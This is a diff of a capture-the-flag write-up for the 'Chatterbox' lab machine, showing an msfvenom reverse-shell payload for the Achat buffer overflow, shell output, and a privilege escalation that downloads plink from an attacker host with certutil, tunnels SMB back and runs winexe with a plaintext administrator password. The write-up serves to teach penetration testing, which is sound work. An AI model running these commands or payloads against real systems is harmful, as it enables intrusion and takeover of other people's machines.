@@ -9,8 +9,12 @@
 
 ![Chatterbox](../images/chatterbox.png)
 
+I relied on the course hints pretty heavily to capture the CTF. The additional resources below were of great help.
+
 Additonal resources/reading:
 * [Privilige Escalation Windows - Sushant ](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
+* [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
+* [Reverse Shell Explained](https://www.sans.edu/student-files/presentations/LVReverseShell.pdf)
 
 ---
 ### Scanning/Enumeration
@@ -45,7 +49,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 3992.60 seconds
 ```
 ---
-### Exploit
 ---
 
 This looks interesting...
@@ -58,14 +61,14 @@ Achat 0.150 beta7 - Remote Buffer Overflow               | windows/remote/36025.
 Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)  | windows/remote/36056.rb
 ```
 
-I grabbed and modified the 36025.py script
+I grabbed and modified the 36025.py script...
 
 1. Generate a new msfvenom payload
 
 ```
  msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.41 LPORT=4445 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
 ```
-2. Copy the new payload output into the scripts.
+2. Copy the new payload output into the scripts
 ```
 buf =  b""
 buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
@@ -277,7 +280,7 @@ Exploit target:
 python 36025.py 
 ```
 
- We're connected...
+ We're connected. Note that if the script doesn't run correctly the first time you may have to reboot the server and repeat. This has taken me several retries.
 ```
 C:\Windows\system32>whoami
 whoami
@@ -324,7 +327,7 @@ Hotfix(s):                 208 Hotfix(s) Installed.
 ---
 ### Privilege Escalation
 ---
-There are a couple of connections that did not show up previously  on 0.0.0.0:445 (SMB).This could be a potential vector of attack
+There are a couple of connections that did not show up previously on 0.0.0.0:445 (SMB). This could be a potential vector of attack.
 
 ```
 C:\Windows\system32>netstat -ano
@@ -413,7 +416,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
 ```
-The plan is to create a reverse shell using plink and then run:
+The plan is to create a reverse shell using plink and then run winexe to esclate priviliges:
 1. Download the latest plink  32-bit exe (https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
 2. Create a local ftp server on the attacker system (sudo python -m SimpleHTTPServer 80)
 3. Upload the plink exuctable on the target system (certutil -urlcache -f http://10.10.14.9:8000/plink.exe plink.exe )
@@ -437,3 +440,6 @@ dir
                1 File(s)        601,000 bytes
                2 Dir(s)  18,159,943,680 bytes free
 ```
+4. On the target system run: plink.exe -l root -R 445:127.0.0.1:445 10.10.14.9  (you will need to press enter several times)
+5. If it all goes well you now have a reverse shell. Next use winexe: winexe -U Administrator%Welcome1 //127.0.0.1 "cmd.exe"
+6. if this goes well you have administrator priviliges. Grab the root.txt flag!
